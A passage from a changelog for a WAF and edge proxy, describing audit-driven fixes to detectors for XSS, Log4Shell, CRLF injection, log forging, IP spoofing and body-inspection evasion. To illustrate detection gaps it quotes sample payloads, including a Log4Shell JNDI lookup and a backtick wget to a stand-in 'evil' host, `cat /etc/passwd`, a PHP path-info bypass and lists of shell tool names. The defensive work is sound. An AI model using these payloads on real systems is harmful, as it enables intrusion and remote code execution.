  whitespace around `=`) evaded it — e.g. `<svg onload =alert(1)>`. Replaced the
  four literal checks with a single frontier `gmatch` that captures each
  `on<word>` followed by optional whitespace + `=` and checks it against an
  explicit handler set (auto-firing handlers — animation/transition, SVG SMIL
  begin/end, `<details ontoggle>`, popover `onbeforetoggle`, media autoplay —
  plus the classic interaction handlers). The explicit set keeps benign `on…=`
  params (`onboarding=`, `online=`) from matching, and the `%f[%w]` frontier
  keeps the WPML `?…creationError=101` non-match; it's also one scan instead of
  four. Tier unchanged (**challenge** — a solvable interstitial, not a block).
  Known FP surface at challenge: a benign request param named exactly like a
  handler, **or** a reflected GET value that contains a literal `handler=` code
  snippet (e.g. searching a dev/tutorial site for `onclick=`). This already
  applied to the original four handlers without reported incidents; the expansion
  widens it to the more search-common `onclick`/`onchange`. Kept at challenge
  because these are real reflected-XSS vectors and the hit is a solvable
  challenge — flip rule 302 to `logonly` for a burn-in if the FP rate warrants.
  Found by the 2026-07 edge Lua audit (F33, low).
- **Log4Shell header detector now catches every single-encoded form of `${` (F35).**
  `detect_log4shell` (rule 328 `WAF_CVE:LOG4SHELL`, logonly) prechecks each
  request header for a `${` before decoding, but the gate was **narrower than its
  own decoder**: it admitted only the fully-encoded `%24%7b` (lowercase-hex),
  while the decode+match two lines below flags *anything* that one-pass-decodes
  to a `${…}` lookup. So a header like `User-Agent: %24%7Bjndi:ldap://evil/a%7D`
  (uppercase hex — what `curl` emits) and the partial forms `%24{jndi:` /
  `$%7bjndi:` / `$%7Bjndi:` all decode to `${jndi:` but were skipped before the
  match ever ran. The gate now admits all six single-`%xx`-encoded adjacency
  forms of `${` via four plain needles (`${`, `%24%7`, `%24{`, `$%7`) — kept as
  substring finds so no per-header lowercase copy is allocated on the hot path,
  and FP-neutral because the decode+match remains the sole hit-decider. The
  args/body path was already unaffected (`normalize` double-decodes); double-
  encoded (`%2524%257b…`) and `%u007b` forms don't one-pass-decode to `${` and
  remain the documented args/body-normalize asymmetry. Found by the 2026-07 edge
  Lua audit (F35, low).
- **WAF CRLF detector now catches canonically-capitalized header injections
  (F34).** The raw-CR/LF branch of `detect_crlf_injection` (rule 605 `WAF_CRLF`,
  challenge tier) matched the lowercase header-name literals (`set-cookie`,
  `location`, `content-type`/`-length`) against the **un-lowercased** scan
  string, so a body/arg value injecting a raw newline followed by a
  conventionally-capitalized response-header name (`Set-Cookie:`, `Location:`)
  slipped past — only the URL-encoded branch lowercased. Now the scan string is
  lowercased once and the raw branch matches against that copy too (CR/LF bytes
  are unaffected by `lower()`, so the newline anchor still requires a real
  CR/LF). Widening detection to the natural capitalized casing does trip some
  legitimate multi-line panel/webmail traffic (a body/field line starting with
  `Location:` or `Content-Type:`), so **rule 605 is stepped down from `challenge`
  to `logonly` for a burn-in** — the fix logs the real FP rate without
  challenging anyone; promote back to `challenge` after burn-in
  (CLAUDE.md logonly→challenge→block). Found by the 2026-07 edge Lua audit
  (F34, low).
- **Edge decision logs are now proof against log forging (F39).** Several
  `[cfm]` log lines concatenate `ngx.var.uri` — which nginx serves
  **percent-decoded** — and the client `Host`, so a request path containing
  `%0A`/`%0D` decoded to a literal newline/CR inside the logged value and let an
  unauthenticated client inject forged `[cfm] ...` lines into `error.log` (the
  `/.well-known/` bypass logs at INFO on every pre-auth request, so no auth was
  needed). All user-controlled log values now pass through a control-char
  neutraliser (`log_sanitize`): the hot `log_route()` path sanitizes the whole
  concatenated message, and a new `log_ev()` helper sanitizes every argument at
  the three multi-arg `ngx.log` sites (clearance re-mint/validator errors and the
  top-level request-failure handler). Control bytes (NUL, C0 incl. CR/LF, DEL)
  are hex-escaped (`\x0A`) so they stay visible for forensics without breaking
  one-line-per-event parsing; clean messages are byte-unchanged. Found by the
  2026-07 edge Lua audit (F39, low).
- **`/__ssl_debug` now enforces loopback with the un-forgeable real peer (F56).**
  The sslcollector debug endpoint (`ready`/`version` of the `sslcache` dict) was
  gated only by `allow 127.0.0.1; deny all;`, which the `ngx_http_access` module
  evaluates against the **real_ip-rewritten** `$remote_addr` — so a
  Cloudflare-fronted request carrying `CF-Connecting-IP: 127.0.0.1` (behind a
  trusted proxy) could forge a loopback origin and read it. The four
  `location = /__ssl_debug` blocks (`openresty.conf` + `angie.conf`, ×2 server
  blocks each) now add the same `cfm_purge.check_loopback()` gate that
  `/cfm-admin/purge-ip` uses — it reads the pre-rewrite `$realip_remote_addr`,
  which a header cannot spoof — and 403 a non-loopback peer, plus `allow ::1;` to
  match. **DNAT-safe:** this endpoint is also the canonical edge health probe
  (the DNAT failsafe GETs it and treats non-200 as "edge down"); the genuine
  loopback probe (no forwarded headers, real peer `127.0.0.1`) always passes, and
  if `cfm_purge` can't load the gate **fails open** (still 200) so a broken module
  can never trigger a false DNAT-off. Found by the 2026-07 edge Lua audit (F56, low).
- **Edge proxy no longer leaks its version in the `Server` header / error pages
  (F61).** Added `server_tokens off;` to the `http{}` block of both `openresty.conf`
  and `angie.conf`. Previously unset (nginx defaults to `on`), so responses and
  stock error pages advertised the exact proxy build — free reconnaissance for
  matching version-specific exploits. `off` keeps the product name but drops the
  version. Found by the 2026-07 edge Lua audit (F61, info).
- **WAF now inspects request bodies on clean-URL / REST endpoints (F07).** The
  body-read gate `waf_should_read_body` was a **positive URI allowlist** (wp-*,
  `/api/`, `/admin`, `*.php`, …) and **POST-only**, so a body-borne SQLi/RCE/
  webshell POSTed to any non-listed extension-less route (`/checkout`, `/order`,
  clean-URL app routers) — or sent via PUT/PATCH — was never read, and every
  body-aware rule saw an empty body (the Go log engine scores access logs only,
  so nothing compensated). The gate now also reads the body for **POST/PUT/PATCH**
  on **any** path when the **Content-Type is inspectable** (`urlencoded`/`json`/
  `multipart`/`xml`/`text`) and the **Content-Length is present and bounded**
  (`waf_body_read_max_cl`, default 1 MiB, env `CFM_WAF_BODY_READ_MAX_CL`). To
  guarantee **zero behavioural change for existing POST flows**, a **POST** on an
  allowlisted URI still reads regardless of size (the pre-F07 fast-path); every
  other case — POST on a clean URL, and **PUT/PATCH on any path including
  allowlisted ones** (never body-inspected before F07, so bounding them is
  strictly safer) — goes through the shared size/Content-Type gate. Binary/media
  Content-Types, over-cap bodies, and **any chunked / unmeasurable-length** body
  are skipped so large uploads keep **streaming** (the `proxy_request_buffering=off`
  media location is never forced to buffer, even for a large `PUT /uploads/x.zip`).
  On the main dynamic path
  (`location /`) nginx already buffers the body (`proxy_request_buffering on`), so
  the added cost is bounded scan CPU, not new I/O. Same rules/tiers, coverage
  only — the block-tier `WAF_SQLI`/`WAF_RCE`/`WAF_UPLOAD_FNAME` families now scan
  bodies on more paths, so watch their hit-rates after upgrade (same posture as
  F08; `waf_security` `DRY_RUN` is the lever if false positives appear). Found by
  the 2026-07 edge Lua audit (F07).
- **WAF: pre-auth base64 `<?php` on wp-admin AJAX is now visible (F11).** The
  encoded-`<?php` opener rules (437 url/entity form, 438 base64) were suppressed
  on the entire `/wp-admin/` prefix on the assumption those requests had already
  passed WordPress cookie-auth. That is wrong for `admin-ajax.php` and
  `admin-post.php`, which serve `wp_ajax_nopriv_*` / unauthenticated `admin-post`
  actions and are reachable pre-auth — so an unauthenticated attacker could
  smuggle a base64 `<?php` body there completely unseen. The naive fix (arm 438
  there) would re-run a documented false-positive incident: WPCode / Code-Snippet
  plugins legitimately base64-POST `<?php` to `admin-ajax.php` on every snippet
  save, and the edge can't tell an authed save from a nopriv attack. So the
  carve-out is split: 437 (FP-prone) stays fully suppressed on `/wp-admin/`, and
  438 (base64) is recorded at **`logonly`** on the two pre-auth endpoints —
  detection with **zero enforcement** (no challenge, no block, no ban: a
  `logonly` hit is dropped by the autoblock feed, which ingests only
  `action=block`, and no `WAF_BACKDOOR` rule is block-tier) — so operators can
  watch the pre-auth
  base64 stream (rule 438 on an admin-ajax URI) and separate real attacks from
  plugin noise before any promotion. The rest of `/wp-admin/` (authenticated
  editors) is unchanged. Found by the 2026-07 edge Lua audit (F11).
- **WAF encoded-`<?php` opener (rule 437) no longer challenges legit content
  POSTs (F16).** `detect_php_encoded_opener` flagged the URL-encoded
  (`%3C%3Fphp`), HTML-entity (`&lt;?php`) and JS-unicode encoded forms of a PHP
  opener in request bodies — but those are the *normal on-wire encoding of
  legitimate content*, not evasion: an `application/x-www-form-urlencoded` body
  is url-encoded in its entirety, so any comment/forum/contact-form/paste POST
  that merely contains `<?php` produced `%3C%3Fphp` and was challenged at rule
  437 (breaking non-browser API/mobile clients that can't solve the
  interstitial); rich-text editors HTML-escape pasted code; and Go/JS JSON
  encoders escape `<` by default. Those three forms are now **removed** from the
  rule. What remains is attack-shaped with ~zero FP: the **base64** form (438,
  unchanged — a browser never base64-encodes a field) and the **JS `\x`
  hex-escape** form (`\x3c\x3fphp`) at 437 — kept because a url-encoded backslash
  is `%5C` (a form body can't carry a literal `\x3c`) and `normalize()` never
  unwraps `\xNN`, so 437 is the only coverage for a *markerless* hex opener.
  Coverage of the removed forms is not lost: a *marker-bearing* payload (`<?php
  system($_GET…`) is still caught by the PHP webshell-body scorer (rule 404,
  `detect_php_webshell_body`), which url-decodes the body and scores `<?php` +
  exec-marker + superglobal at the same `challenge` tier. Found by the 2026-07
  edge Lua audit (F16).
- **WAF command-dispatcher detector (rule 310) no longer challenges legit
  `system=`/`command=` values (F14).** `detect_cmd_param_key` fired
  `CMD_SYSTEM`/`CMD_COMMAND` when a `system=`/`command=`/`cmd=` value tokenised
  to a word in its shell-command list, but (a) the tokeniser split on `-`, so
  compound identifiers shattered — `system=host-01` → `{host, 01}` → matched
  `host`; and (b) the list held ubiquitous words (`id`, `host`, `more`, `less`,
  `head`, `tail`, `env`, `cat`, `ls`, `ps`, `w`, `pwd`, `fetch`, `route`,
  `ping`, `dig`, `arp`). Since `system=`/`command=` have no elFinder carve-out,
  legit values (`command=more`, `system=host-01`, `command=fetch`, `env=prod`,
  OpenCart `route=`) were challenged — breaking XHR/JSON consumers ("Data is
  not JSON"). Fix: hyphen is no longer a token separator (real `cmd arg`
  invocations use whitespace), and the ambiguous words were removed from the
  list. Weaponized forms still fire via the existing metachar/path checks
  (`cat /etc/passwd`, `id;`, `command=curl http://…`); only the bare,
  un-metachar'd recon probe (`command=id`) is no longer flagged — an accepted
  trade for eliminating the FP class. Unambiguous tool names (`whoami`,
  `uname`, `wget`, `curl`, `nc`, `bash`, `chmod`, `passthru`, …) still fire.
  Found by the 2026-07 edge Lua audit (F14).
- **WAF multipart-boundary check (rule 604) no longer challenges RFC-legal
  boundaries (F15).** `detect_content_type_anomaly`'s `CT_BAD_BOUNDARY` validated
  the `boundary=` value against `[A-Za-z0-9._-]` only, but RFC 2046
  `bcharsnospace` also permits `' ( ) + , / : = ?`. Real server-to-server MIME
  producers use them — JavaMail (`----=_Part_0_123.456`), Python `email`
  (`===============…==`), SOAP/Axis — so their multipart POST was challenged at
  rule 604. These are non-browser clients that cannot solve a JS challenge, so
  the request broke outright. The validator now matches `bcharsnospace` exactly;
  characters *outside* it (space, control bytes, `<` `>` `;` `"` `@` `$` `%`
  backtick — the ones that actually desync a WAF-vs-PHP multipart split) are
  still rejected, so the anti-evasion value is preserved. Found by the 2026-07
  edge Lua audit (F15).
- **WAF body inspection no longer truncated below the per-Content-Type scan
  budget (F08).** The edge body reader (`get_req_body_for_waf` in `cfm.lua`)
  handed the WAF at most `waf_body_max_len` = **8192** bytes, but the engine's
  per-Content-Type budgets are larger (`json` 32768, `multipart`/`xml` 16384) —
  so the reader truncated the body *before* the budget applied, and those
  budgets were never realised. A classic body-size evasion (pad >8 KB of filler,
  then the SQLi/RCE/webshell payload) escaped every body-aware rule while the
  origin processed the full body. The reader cap is raised to **32768**
  (= the largest budget), making the per-type budget the sole truncation
  authority; same rules, same tiers, coverage only, and well within the
  existing 65536-byte challenge-replay buffer. A cross-referenced invariant
  (reader cap ≥ max `body_scan_budget`) is asserted by
  `scripts/tests/cfm_waf_body_budget_test.lua` (verified to fail at the old
  8192). **Operators:** this widens the *scanned window* of the already
  block-tier + autoblock-armed families (`WAF_SQLI`/`WAF_RCE`/`WAF_UPLOAD_FNAME`)
  from 8 KB to 16–32 KB of body — their earlier block/FP burn-in predates this
  window, so watch those hit-rates after upgrade; a legit 8–32 KB JSON/multipart
  body matching a signature past byte 8192 now blocks (and can 6h-ban). As a
  symmetric side effect the ClamAV upload lane (which reads the same capped
  body) now routes multipart uploads whose `filename=` sits past byte 8192 to
  the scanner (a coverage gain). Do **not** lower the `CFM_WAF_BODY_MAX_LEN`
  override below the max budget or you reopen F08. Found by the 2026-07 edge Lua
  audit (F08).
- **Challenge/WAF bypass-list generator hardened against overbroad / poisoned
  feed prefixes.** `configs/challenge_waf_bypass.conf` is a geo include whose
  every prefix makes `cfm.lua` early-return straight to origin, disabling WAF
  **and** challenge for that IP space. Its generator (`scripts/build_bypass_list.py`,
  a manually-run Python script — there is no "Go generator" despite the audit
  note) previously validated only CIDR *syntax*: an over-broad or poisoned feed
  prefix (`0.0.0.0/0`, a `/8`, a whole hosting ASN) would have been emitted
  verbatim and silently turned protection off for a huge range, and a
  feed-controlled JSON `creationTime` written into a comment could inject a
  standalone geo directive via an embedded newline. The generator now: rejects
  non-public ranges (`0.0.0.0/0`/`::/0`, RFC1918/loopback/link-local/multicast/
  reserved) and anything broader than the shipped floors (IPv4 `/16`, IPv6 `/32`
  — no current prefix dropped), with per-source and total count caps that abort
  the run; sanitises all metadata (strips CR/LF/control) before writing; writes
  atomically (temp + fsync + rename); and refuses to replace the list with a
  suspiciously small one (< floor or a >50% shrink), keeping the last-good file.
  A new offline CI guardrail `scripts/tests/check_bypass_list.sh` (+
  `bypass_list_test.py`) unit-tests these bounds and re-validates the committed
  `challenge_waf_bypass.conf` with the generator's own `normalize_prefix` (no
  network, no rule drift), wired into `security.yml` and `/preflight`. The unused
  duplicate `scripts/challenge_waf_bypass.conf` was removed and the generator's
  default output now resolves to the authoritative `configs/` copy. Found by the
  2026-07 edge audit coverage-gap review.
- **GhostLock (CVE-2026-43499) posture — design note.** Added
  `docs/ghostlock-tenant-seccomp-design.md`: a design-only guide for the one
  runtime control that could *prevent* (not just degrade/detect) the public
  local-root exploit — a **per-tenant seccomp filter** denying the futex-PI
  operations (`FUTEX_LOCK_PI`/`TRYLOCK_PI`/`WAIT_REQUEUE_PI`/`CMP_REQUEUE_PI`)
  to the web-tier uid range (`cfm_watched_uids`). Documents why it cannot be a
  BPF-LSM rule (no LSM hook on `futex()`), why it is scoped to **bare metal /
  empty VM / custom installs** and explicitly *not* cPanel/DirectAdmin/CloudLinux
  (CageFS/LVE owns tenant confinement there), and how it layers on the shipping
  levers `kernsec randomize_kstack_offset=on` and `cfm-lsm CFML-FS-008`. No code
  change — guide only.
- **Scoped-vs-admin boundary — edge `lua-stats` (F01):** the `/cfm-admin/lua-stats`
  dashboard endpoint (rendered inside OpenResty/Angie) gated access with an
  `auth_request` pointed at `/api/v1/tokens/me` — a **scoped-OR-admin** endpoint
  that returns 200 for *any* valid token. A scoped cPanel **viewer** token
  therefore passed the gate and received the **fleet-wide** stats blob: every
  tenant's WAF exclude host/path lists and per-rule modes (logonly vs block),
  plus cert and decision-cache counters — enough to craft WAF bypasses against
  the whole box. Added an admin-only auth probe `/api/v1/admin/authcheck`
  (`RequireAdmin`; 403 for scoped/anonymous) and repointed the `auth_request`
  gate to it in **both** `openresty.conf` and `angie.conf` (two server blocks
  each). The admin WebUI dashboard — the only legitimate consumer — is
  unaffected. Found by the 2026-07 edge Lua audit.
- **WAF hit-rates cross-tenant leak (F02):** `GET /api/v1/waf/hit-rates` was
  gated scoped-OR-admin but read the `?host=` query verbatim with no scope check,
  so a scoped cPanel user could read **any** vhost's per-rule WAF hit rates — and
  an empty host aggregated **every** tenant — revealing which rules are logonly
  vs block and where they fire. `handleWAFHitRates` now enforces the token scope,
  keyed on **role** (not on the presence of a scope map — so a vhost-less scoped
  token can never be misread as admin): a non-admin caller must target a single
  host inside a **non-empty** allowlist; an empty host, an empty scope, or an
  out-of-scope host is `403`. The host is normalized (lowercased) once so the
  scope check and the case-sensitive history read agree. Admin/loopback (the CLI)
  is unchanged. Mirrors the role-keyed `scopedMySQLFilterHandler` / `vhostAllowed`
  guards; added to `docs/endpoint_scope_inventory.md`. Found by the 2026-07 edge
  Lua audit.
- **WAF (rule 317, `WAF_CMD_PAYLOAD:PAY_BACKTICK`, challenge): fixed a dead
  backtick-RCE matcher that let most backtick command substitutions through.**
  The command allowlist was written `inner:match("^%s*(wget|curl|…)%f[^%a]")`,
  but **Lua patterns have no `(a|b|c)` alternation** — that group matched the
  literal string `wget|curl|…`, so it never fired. Only the adjacent
  `;`/`|`/`&&`-inside-backticks branch worked, so `` `wget http://evil/x` ``,
  `` `id` ``, `` `whoami` `` (no shell metachar) passed unchallenged. The leading
  token inside the backticks is now captured (`^%s*(%a+)`) and tested against a
  command set, so a full word must match exactly (`` `category` `` ≠ `cat`). It
  scans query args only, the search-field carve-out (q/s/term/search/query) is
  preserved, and the tier stays **challenge** (no block/ban). Covered by
  `scripts/tests/cfm_waf_backtick_smuggling_test.lua`. Found by the 2026-07 edge
  Lua audit (F05).
- **WAF / challenge excludes: the in-path (Lua) glob matcher now scopes `*`/`?`
  to a single path segment, matching the Go enforcement matcher.** The Lua
  `glob_to_lua_pattern` (`cfm_waf_excl.lua`) expanded `*`→`.*` and `?`→`.`, both
  of which cross a `/`, while the Go log-driven matcher (`globToRegex` in
  `exclude_store.go`) uses `[^/]*`/`[^/]`. So an operator exclude like
  `/wp-admin/*` switched the WAF (or challenge) **off in-path** for the entire
  `/wp-admin/a/b/c…` subtree, while the log-driven side only excluded direct
  children — a silent, one-sided widening of the WAF-off region onto unintended
  deep paths. Lua now emits `[^/]*`/`[^/]` too, so both engines agree. Hosts are
  unaffected (no `/`). To exclude a whole subtree, use a **non-glob path prefix**
  (`/wp-admin`), which already matches the subtree at a segment boundary.
  Behaviour change: an exclude relying on `*` to cross `/` in-path now stops at
  one segment (as it always did on the log-driven side). `[...]` bracket-class
  globs are still matched literally in Lua (Go treats them as a class) — a
  rarer, narrower-in-Lua consistency gap tracked as a follow-up. Covered by
  `scripts/tests/cfm_waf_excl_test.lua`. Found by the 2026-07 edge Lua audit (F10).
- **WAF (body-aware rules): a padded query string could evict the POST body from
  inspection (F09).** The shared normalized scan surface `get_norm_ab` built
  `cap(args .. "&" .. body, budget)` — with the attacker-controlled query string
  **first** and a single cap over the merge — so a query padded to the
  Content-Type body budget consumed the whole allowance and truncated the body
  away. Every body-aware detector that reads this surface (SQLi, `php_wrappers`,
  `ssrf`, `js_proto`, `log4shell`, `superglobal`, `c2_tunnel`) then missed a
  body-borne payload: e.g. `POST /?<8 KB of padding>` with a urlencoded body
  carrying `php://…` or a `UNION SELECT` was not inspected. `get_norm_ab` now
  caps args and body **independently** (each to the body budget) before the
  concat, so the body always gets its full allowance; the transient stays
  bounded to ~2×budget. The same independent-cap was applied to
  `detect_crlf_injection` (rule 605, which builds its own args+body scan
  surface) and to the detector-internal fallback scan strings, so no divergent
  copy of the pattern remains. Covered by
  `scripts/tests/cfm_waf_body_budget_test.lua` (Test 9 — urlencoded/JSON budgets,
  `php_wrappers`/SQLi/CRLF paths, verified to fail on the old single-cap form).
  Found by the 2026-07 edge Lua audit (F09).
- **WAF/challenge bypass via PHP path-info on the static-asset fast path (F06).**
  The edge static-asset `location ~*` regex matched the URL *suffix*
  (`\.(css|js|woff|…|map)$`), not the file Apache actually serves, and runs
  `access_by_lua_block { return; }` — skipping `cfm.lua` (WAF **and** challenge)
  entirely. So `GET /uploads/evil.php/x.css` matched the `.css` bypass yet, under
  `cgi.fix_pathinfo`, executed `evil.php` at the origin with the edge inspection
  disabled. All four bypass locations (OpenResty + Angie, HTTP + HTTPS) now anchor
  the regex with a PHP-scoped negative-lookahead —
  `^(?!.*\.(?:phtml|pht|php[0-9]|php|phar)/).*\.(?:css|js|…|map)$` — so any URL
  with a `.php…/` (or `.phtml/`/`.pht/`/`.php5/`/`.phar/`) segment falls through to
  `cfm.lua` and is inspected again. This closes the universal `cgi.fix_pathinfo`
  `.php/` vector (which executes regardless of Apache handler style). Genuine
  static is unaffected, including `?v=` cache-busters (nginx matches the location
  against `$uri`, which excludes the query) and legitimately-named `foo.php.css`.
  Scoped to the PHP suffix family by design: multi-extension names
  (`/evil.php.jpg/…`, executable only under the legacy `AddHandler` form, not
  modern EA4 `<FilesMatch \.php$>`) and non-PHP handlers (`.cgi`/`.pl`/`.py`/
  `.shtml`) stay on the fast path — narrower residuals still covered by the
  log-driven behavioural engine. Verified by PCRE case matrix, `nginx -t`, live
  nginx routing (incl. `%2f` encoded-slash, which nginx decodes into `$uri`
  before location matching, so it is not evadable), and an adversarial review.
  Found by the 2026-07 edge Lua audit (F06).
- **Account-transfer tunnel: source-IP spoofing via client-supplied
  X-Forwarded-For (F03).** The raw TCP tunnel that carries WHM live-transfer
  rsync/dsync streams (`/acctxferrsync`, `/acctxferdsync`) replayed the client's
  headers to loopback cpsrvd and only injected `X-Forwarded-For`/`X-Real-IP`/
  `CF-Connecting-IP` **if the client hadn't already sent one** — so a
  client-supplied value passed through verbatim. cpsrvd's Apache trusts
  X-Forwarded-For from loopback (mod_remoteip), and the tunnel runs with the
  challenge/WAF bypassed on an internet-facing panel port, so an attacker could
  forge their apparent source IP into cpsrvd's audit log, cPhulk brute-force
  tracking, and IP allow/deny logic (e.g. impersonate a cPhulk-allowlisted IP,
  or frame an arbitrary one). Every other panel path already overwrites these
  with `$remote_addr`; this tunnel was the gap. It now takes sole authority over
  the forwarding/real-IP header set: it strips **every** client-supplied
  `X-Real-IP`/`X-Forwarded-For`/`X-Forwarded-Host`/`X-Forwarded-Port`/
  `X-Forwarded-Proto`/`X-Forwarded-Server`/`CF-Connecting-IP` (case-insensitively)
  and re-injects trusted values from `$remote_addr`, exactly mirroring the
  sibling `proxy_set_header … $remote_addr` blocks. Obsolete line folding
  (RFC 7230 §3.2.4) is dropped wholesale so a spoofed header can't ride in as a
  fold of a benign one. This is a no-op for legitimate transfers
  (`whm_xfer_download-ssl` never sends these headers, nor folds any); only a
  forged header/fold is dropped. Covered by
  `scripts/tests/cfm_panel_tunnel_xff_test.lua` (runs the real tunnel over
  stubbed cosockets and asserts on the exact upstream header block; verified to
  fail against the pre-fix file). Found by the 2026-07 edge Lua audit (F03).

### Fixed
- **A missing bridge token no longer 500s every request (F47).** When the bridge
  auth token file was absent (e.g. a reboot where nginx starts before the cfm
  daemon writes it), `cfm.lua` raised `error()` at chunk top level — and because
  `access_by_lua_file` re-runs the chunk per request, that returned **HTTP 500
  for every request** until the daemon started. Yet a present-but-unreachable
  daemon fails **open** — so identical "can't reach the daemon" conditions
  produced opposite outcomes based only on token-file presence (and this is the
  one failure mode the DNAT `__ssl_debug` health check can't detect, since the
  edge is up). The missing-token case now flows through the **same policy as an
  unreachable daemon**: `get_decision` serves cached clean-allows first, then
  fails through `fail_decision` (allow under the default `CFG.fail_open`, block if
  fail-closed) without the pointless auth-less RPC. It's logged loudly at ERROR
  ("FAILING OPEN — requests pass without bridge enforcement", with the token
  path), throttled to once/60s across workers so a prolonged outage can't flood
  the log. Recovers on its own once the daemon writes the token. Chosen to never
  interrupt service during restarts/maintenance. Because the bridge token is also
  the clearance HMAC secret, `cfm_clearance.validate()` was hardened to fail
  **closed** on a nil/empty secret (mirroring `mint`) — otherwise the now-reachable
  empty-secret state computes a publicly-forgeable empty-key HMAC, letting an
  attacker forge a clearance during the window (block-tier WAF still blocks
  regardless). Found by the 2026-07 edge Lua audit (F47, low).
- **Decision cache key now hashes the full request path (F38).** `get_decision`
  built the per-URL `cfm_decisions` cache key from `uri:sub(1, 64)`, so two paths
  sharing a 64-byte prefix mapped to one entry — and since only clean allows are
  cached, an attacker could warm the cache with a benign same-prefix request and
  reuse the `allow` for a longer path whose per-path bridge rule would
  challenge/block (the bridge is never consulted for the second path). The key now
  hashes the **full decoded path** with `ngx.md5`, so distinct paths never
  collide, while the key stays bounded (a path can be kilobytes). The query string
  is intentionally excluded — it isn't sent to the decision bridge, so a verdict
  can't depend on it. The per-URL key is now also keyed on `scope` (matching the
  static-asset branch), so a scoped verdict is never reused cross-scope. The key
  construction is extracted into a `decision_cache_key` helper (unit-tested).
  Found by the 2026-07 edge Lua audit (F38, low).
- **WAF-hit push cooldown now bounds scanner floods without masking autoblocks
  (F31).** `should_push` dedups the per-hit `cfm.waf.log` record + `ip_push` RPC
  using an shdict `:add`, but keyed on the **full reason** — and scored rules append
  a per-request `:score=N` (and a per-hit tag), e.g. `WAF_BAD_UA:<tag>:score=6`. So a
  scanner sweeping many URIs from one IP produced a different key per hit, escaping
  the 60s cooldown entirely and emitting one log record + one RPC **per hit** —
  exactly under the flood the cooldown targets. The cooldown now keys on
  `(ip, reason family, action tier)`: the **family** (before the first `:`, the same
  identity `WAF_HIGH_RISK_REASONS` uses) drops the volatile score/tag suffix, and the
  **action tier** is kept because WAF families mix enforcement tiers (e.g. `WAF_RCE`
  = block rule 320 + logonly 322-327) and the Go autoblock feeds on `action=block`
  pushes only — a family-only key would let a cheap logonly recon hit consume the
  window and suppress a later block hit's push, so the IP would never be autoblocked
  (an under-report / evasion primitive, caught in review). Same-tier score/tag floods
  still collapse to one push; the first push of each tier carries the full reason.
  Found by the 2026-07 edge Lua audit (F31, low).
- **Clearance host-binding no longer mangles IPv6-literal Hosts (F40).**
  `cfm_clearance`'s `normalize_host` stripped a trailing `:<digits>` as if always
  a port (`h:gsub(":%d+$","")`), so an **unbracketed** IPv6 literal lost its final
  hextet (`2001:db8::1` → `2001:db8:`) and brackets were never unwrapped — distinct
  IPv6 hosts collapsed to one value, so a clearance minted for `2001:db8::1` was
  accepted on the adjacent `2001:db8::2` (weakened host binding; not a full bypass
  since both sides re-normalize, but it diverged from the Go normalizer). Rewrote
  it to mirror Go's `normalizeClearanceHost`: unwrap `[ … ]`, strip a port only for
  a bracketed literal or a single-colon `host:port`, and leave an unbracketed
  literal (≥2 colons) intact. The Lua test mirrors the Go `TestNormalizeClearanceHost`
  cases verbatim to keep the server-minted and Lua-validated host in lockstep.
  IPv6-literal Host headers are rare on shared hosting, so real exposure was low.
  Found by the 2026-07 edge Lua audit (F40, low).
- **cfm_geo now self-heals after a transient MaxMind DB open failure (F46).**
  On the first per-worker lookup, an `mmdb.init`/`mmdb.new` failure set
  `_geo_api_mode = "disabled"` **permanently** for the worker's life — `country()`
  returned `""` for every later request with no retry until a proxy reload. A
  GeoLite2 update replaces the `.mmdb` via atomic rename, so a worker running its
  once-per-worker init during that swap window got a transient open error and
  geo stayed off indefinitely (`""` is fail-open for country blocklists but
  **fail-closed for allowlists**, so a worker could silently stop enforcing an
  allowlist with no self-recovery). Now a transient open/init failure keeps the
  backend mode and retries after a `GEO_INIT_RETRY_SEC` (30s) cooldown, so a later
  good DB is picked up automatically. The retry only runs while init has failed
  (a failed open creates no mapping) and stops permanently on first success, so it
  can't reintroduce the mmap accumulation this module exists to prevent. Applies
  to both the `init_lookup` and `new_object` backends. The load-time "unsupported
  library" disabled state (a genuinely permanent condition) is unchanged. Found by
  the 2026-07 edge Lua audit (F46, low).
- **WAF C2-tunnel host matching no longer false-positives on longer hostnames
  (F36).** `detect_c2_tunnel` (rule 702 `WAF_C2:TUNNEL`) matched its host tokens
  with a plain substring, so the short token `ix.io/` matched any longer hostname
  ending in it — `matrix.io/`, `phoenix.io/`, `citrix.io/` — tagging benign
  traffic as C2. The rule is at **`challenge`** (the detector comment's "ships at
  logonly" was stale — corrected), so these were **real user-facing challenges**
  on anyone referencing e.g. a Matrix homeserver URL, not just log noise. Every
  host token is now anchored on a `%f[%w]` left host boundary (a URL host start is
  always preceded by `//`, `.`, `@`, a delimiter, or the string start — never an
  alphanumeric), kept behind the existing cheap substring precheck so the hot path
  is unchanged; no real C2 URL is lost. Found by the 2026-07 edge Lua audit
  (F36, low).
- **Origin-keepalive no longer logs a false "OpenResty too old" NOTICE on a
  hostless request (F60).** `cfm_origin_ka.balance(443)` conflated two conditions
  in one `elseif`: genuinely lacking SNI-keyed pool support (`sni_pool_ok=false`)
  vs. a fully-capable worker handling a request whose `$host` resolved to `""`
  (e.g. `server_name '_'` with no Host). The empty-host case wrongly logged
  `lua-resty-core lacks SNI-keyed connection pools (needs OpenResty 1.27.1.1+)`
  and **burned the once-per-worker NOTICE latch** — so operators who grep
  `[cfm_origin_ka]` after enabling keepalive (as the docs instruct) wrongly
  concluded HTTPS origin pooling was disabled fleet-wide. The conditions are now
  split: the "no support" NOTICE fires only when `sni_pool_ok` is false; a
  hostless request on a capable worker is served unpooled **silently**, without
  the NOTICE and without consuming the latch. Behaviour is otherwise unchanged
  (still unpooled per-request for that hostless request). Found by the 2026-07
  edge Lua audit (F60, low).
- **Bounded line length in the core log readers too (F26 family).** The same
  unbounded `bufio.ReadString('\n')` fixed for the ingest socket (F26) also lived
  in **all three** `internal/detectors/core` log readers: the **file tailer**
  (`source.go`, reading the access log — its `ErrBufferFull` drain branch was
  **dead code**, since `ReadString` never returns that error), the **docker-logs**
  reader (`docker.go`) and the **journald** reader (`journal.go`). Each could OOM
  the daemon on a single oversized line from its source (a crafted access-log
  line, a compromised container's stdout, a journald record). All three now read
  with `ReadSlice`, which caps each read at the 256 KB buffer and drops an
  over-long line, resyncing at the next newline: `source.go` in place (making its
  existing drain live, advancing the file offset past the dropped line so resume
  skips it); `docker.go`/`journal.go` via a shared `readBoundedLine` helper that
  errors past an 8 MB drain cap rather than reading a never-terminated line
  forever. Discovered while fixing F26; the original finding wrongly assumed the
  file tailer was already bounded.
- **Ingest socket now bounds line length (F26).** `webdetector`'s Unix ingest
  socket (`/run/cfm/ingest.sock`, `root:cfm 0660`, fed by `log-cfm.lua`) read
